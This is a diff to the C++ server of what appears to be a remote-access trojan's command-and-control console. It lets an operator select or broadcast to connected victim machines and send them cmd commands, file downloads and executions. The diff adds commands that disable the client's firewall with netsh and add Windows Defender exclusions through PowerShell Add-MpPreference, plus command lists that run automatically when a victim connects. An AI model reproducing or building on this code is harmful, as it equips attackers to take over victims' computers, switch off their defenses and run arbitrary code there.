@@ -1,4 +1,11 @@
 #include "server.h"
+#include <type_traits>
+
+template <typename E>
+constexpr auto to_underlying(E e) noexcept
+{
+	return static_cast<std::underlying_type_t<E>>(e);
+}
 
 Server* Server::serverptr; //Serverptr is necessary so the static ClientHandler method can access the server instance/functions.
 
@@ -42,6 +49,9 @@ Server::Server(int PORT, bool BroadcastPublically) //Port = port to broadcast on
 void Server::ListenForNewConnection()
 {
 	General::createThread(ListenerThread); //Create thread that will manage all outgoing packets
+
+	//Create thread to send heartbeats since waiting for socket accept to fail takes too long sometimes
+	//General::createThread(ClientConnectionChecker); 
 }
 
 void Server::HandleInput()
@@ -55,89 +65,16 @@ void Server::HandleInput()
 	{
 		std::getline(std::cin, userinput);
 
-		if (currentSessionID == -1)			//handle command while not having selected a client
-		{
-			if (General::processParameter(userinput, "connect"))
-			{
-				inputInt = atoi(userinput.c_str());
-				int tempInt = connections.size() - 1;
-				if (inputInt > tempInt)
-					General::outputMsg("Session doesn't exist.", 2);
-				else
-				{
-					currentSessionID = inputInt;
-					General::outputMsg("Connected to Session " + std::to_string(currentSessionID), 1);
-				}
-				inputInt = 0;
-				userinput.empty();
-			}
-			else if (General::processParameter(userinput, "broadcast"))		//broadcasts commands to all clients
-			{
-				General::outputMsg("Entering broadcast mode. To disable, type 'exitSession'", 1);
-				currentSessionID = -2;
-			}
-			else if (General::processParameter(userinput, "listClients"))	//counts clients (TODO: list clients)
-			{
-				if (connections.size() <= 0)
-				{
-					General::outputMsg("No Clients connected", 2);
-				}
-				else
-				{
-					General::outputMsg("Listing all Clients, Connected: " + std::to_string(connections.size()), 1);
-				}
-			}
-			else
-				General::outputMsg("Please connect to a session with 'connect'", 2);
-		}
-		else						//handle command when client is selected
-		{
-			if (userinput == "exitSession")
-			{
-				General::outputMsg("Exited Session " + std::to_string(currentSessionID), 1);
-				currentSessionID = -1;
-			}
-
-			else if (General::processParameter(userinput, "switchSession"))
-			{
-				inputInt = atoi(userinput.c_str());
-				int tempInt = connections.size() - 1;
-				if (inputInt > tempInt)
-					General::outputMsg("Session doesn't exist.", 2);
-				else
-				{
-					currentSessionID = inputInt;
-					General::outputMsg("Switched to Session " + std::to_string(currentSessionID), 1);
-				}
-				inputInt = 0;
-				userinput.empty();
-			}
-
-			else if (userinput.find("remoteControl") != std::string::npos)
-			{
-				General::cmdMode = !General::cmdMode;
-				SendString(currentSessionID, userinput, PacketType::Instruction);
-			}
-			else if (General::processParameter(userinput, "download")) {
-				SendString(currentSessionID, userinput, PacketType::Download);
-			}
-			else if (General::processParameter(userinput, "execute")) {
-				SendString(currentSessionID, userinput, PacketType::Execute);
-			}
-			else if (General::processParameter(userinput, "script"))
-			{
-				handleScript(userinput);
-			}
-			else if (General::cmdMode)
-			{
-				SendString(currentSessionID, userinput, PacketType::CMDCommand);
-			}
-			else
-			{
-				SendString(currentSessionID, userinput, PacketType::Instruction);
-			}
-		}
+		ParseClientInput(userinput, currentSessionID);
 	}
+}
+
+void Server::CMDExecute(std::string userinput, int& currSessionID) {
+	SendString(currSessionID, (std::string)"remoteControl cmd", PacketType::Instruction);
+	_sleep(1000);
+	SendString(currSessionID, (std::string)userinput, PacketType::CMDCommand);
+	_sleep(1000);
+	SendString(currSessionID, (std::string)"remoteControl cmd", PacketType::Instruction);
 }
 
 void Server::handleScript(std::string script)		//temporary, will implement client-side version
@@ -226,6 +163,7 @@ bool Server::ProcessPacket(int ID, PacketType _packettype)
 			std::cout << CONSOLE_START;
 			return true;
 		}
+		std::cout << "Client: " << ID << " requested file: " << FileName << std::endl;
 
 		connections[ID]->file.fileName = FileName; //set file name just so we can print it out after done transferring
 		connections[ID]->file.fileSize = connections[ID]->file.infileStream.tellg(); //Get file size
@@ -287,8 +225,138 @@ bool Server::HandleSendFile(int ID)
 		std::cout << std::endl << "File sent: " << connections[ID]->file.fileName << std::endl;
 		std::cout << "File size(bytes): " << connections[ID]->file.fileSize << std::endl << std::endl;
 		std::cout << CONSOLE_START;
+		fflush(NULL);
 	}
 	return true;
+}
+
+void* Server::ClientConnectionChecker(void* args) {
+	constexpr int heartbeat = to_underlying(PacketType::Heartbeat);
+	while (true)
+	{
+		for (size_t i = 0; i < serverptr->connections.size(); i++) //for each connection...
+		{
+			if (!serverptr->sendall(i, (char*)heartbeat, sizeof(heartbeat))) //send packet to connection
+			{
+				std::cout << "Failed to send heartbeat packet to ID: " << i << std::endl; //Print out if failed to send packet
+				std::cout << "Lost connection to client ID: " << i << std::endl;
+				std::cout << CONSOLE_START;
+				fflush(NULL);
+				serverptr->DisconnectClient(i);
+			}
+		}
+		_sleep(1000);
+	}
+
+	return nullptr;
+}
+
+void Server::ParseClientInput(std::string userinput, int& clientID)
+{
+	int inputInt;
+
+	if (clientID == -1)			//handle command while not having selected a client
+	{
+		if (General::processParameter(userinput, "connect"))
+		{
+			inputInt = atoi(userinput.c_str());
+			int tempInt = connections.size() - 1;
+			if (inputInt > tempInt)
+				General::outputMsg("Session doesn't exist.", 2);
+			else
+			{
+				clientID = inputInt;
+				General::outputMsg("Connected to Session " + std::to_string(clientID), 1);
+			}
+			inputInt = 0;
+			userinput.empty();
+		}
+		else if (General::processParameter(userinput, "broadcast"))		//broadcasts commands to all clients
+		{
+			General::outputMsg("Entering broadcast mode. To disable, type 'exitSession'", 1);
+			clientID = -2;
+		}
+		else if (General::processParameter(userinput, "listClients"))	//counts clients (TODO: list clients)
+		{
+			if (connections.size() <= 0)
+			{
+				General::outputMsg("No Clients connected", 2);
+			}
+			else
+			{
+				General::outputMsg("Listing all Clients, Connected: " + std::to_string(connections.size()), 1);
+			}
+		}
+		else
+			General::outputMsg("Please connect to a session with 'connect'", 2);
+	}
+	else						//handle command when client is selected
+	{
+		if (userinput == "exitSession")
+		{
+			General::outputMsg("Exited Session " + std::to_string(clientID), 1);
+			if (General::cmdMode) {
+				//Close console
+				SendString(clientID, "remoteControl cmd", PacketType::Instruction);
+			}
+			General::cmdMode = false;
+			clientID = -1;
+		}
+
+		else if (General::processParameter(userinput, "switchSession"))
+		{
+			inputInt = atoi(userinput.c_str());
+			int tempInt = connections.size() - 1;
+			if (inputInt > tempInt)
+				General::outputMsg("Session doesn't exist.", 2);
+			else
+			{
+				clientID = inputInt;
+				General::outputMsg("Switched to Session " + std::to_string(clientID), 1);
+			}
+			inputInt = 0;
+			userinput.empty();
+		}
+
+		else if (userinput.find("remoteControl") != std::string::npos)
+		{
+			General::cmdMode = !General::cmdMode;
+			SendString(clientID, userinput, PacketType::Instruction);
+		}
+		//Download a file inside C:/Windows/ServiceProfiles/LocalService
+		else if (General::processParameter(userinput, "download")) {
+			SendString(clientID, userinput, PacketType::Download);
+		}
+		//Execute a file inside C:/Windows/ServiceProfiles/LocalService
+		else if (General::processParameter(userinput, "execute")) {
+			SendString(clientID, userinput, PacketType::Execute);
+		}
+		//Used to add an exclusion to windows defender using the full path since sometimes just file or folder do not work
+		else if (General::processParameter(userinput, "exclude")) {
+			CMDExecute((std::string)"powershell -Command Add-MpPreference -ExclusionPath \"" + SHELL_MAIN_PATH + userinput, clientID);
+		}
+		//Turn on or off firewall
+		else if (General::processParameter(userinput, "firewall")) {
+			CMDExecute((std::string)"netsh advfirewall set allprofiles state " + userinput, clientID);
+		}
+		//Used to execute a single cmd command
+		else if (General::processParameter(userinput, "cmd"))
+		{
+			CMDExecute(userinput, clientID);
+		}
+		else if (General::processParameter(userinput, "script"))
+		{
+			handleScript(userinput);
+		}
+		else if (General::cmdMode)
+		{
+			SendString(clientID, userinput, PacketType::CMDCommand);
+		}
+		else
+		{
+			SendString(clientID, userinput, PacketType::Instruction);
+		}
+	}
 }
 
 void* Server::ClientHandlerThread(void* args) //ID = the index in the SOCKET connections array
@@ -304,6 +372,7 @@ void* Server::ClientHandlerThread(void* args) //ID = the index in the SOCKET con
 	}
 	std::cout << "Lost connection to client ID: " << ID << std::endl;
 	std::cout << CONSOLE_START;
+	fflush(NULL);
 	serverptr->DisconnectClient(ID); //Disconnect this client and clean up the connection if possible
 	return nullptr;
 }
@@ -364,7 +433,9 @@ void* Server::ListenerThread(void* args)
 			std::cout << "Client Connected! ID:" << NewConnectionID << " | IP: " << inet_ntoa(serverptr->addr.sin_addr) << std::endl;
 			std::cout << CONSOLE_START;
 			General::createThread(ClientHandlerThread, (LPVOID)(&NewConnectionID)); //Create Thread to handle this client. The index in the socket array for this thread is the value (i).
+			General::createThread(OnClientConnected, (LPVOID)(&NewConnectionID));
 		}
+		fflush(NULL);
 	}
 }
 
@@ -401,4 +472,25 @@ void Server::DisconnectClient(int ID) //Disconnects a client and cleans up socke
 	{
 		UnusedConnections += 1;
 	}
+}
+
+void* Server::OnClientConnected(void* args)
+{
+	int ID = -1;
+	char* IDchar = new char[sizeof(int)];
+	itoa(*(int*)args, IDchar, 10);
+	auto thisptr = (Server*)Server::serverptr;
+
+	thisptr->ParseClientInput(std::string("connect ") + IDchar, ID);
+
+	ID = *(int*)args;
+	for (short int i = 0; i < Settings::onconnect.size(); i++) {
+		//Execute each command separately and sleep 1 sec between each of them to avoid any "race-like" conditions
+		thisptr->ParseClientInput(Settings::onconnect[i], ID);
+		_sleep(1000);
+	}
+
+	thisptr->ParseClientInput("exitSession", ID);
+
+	return nullptr;
 }
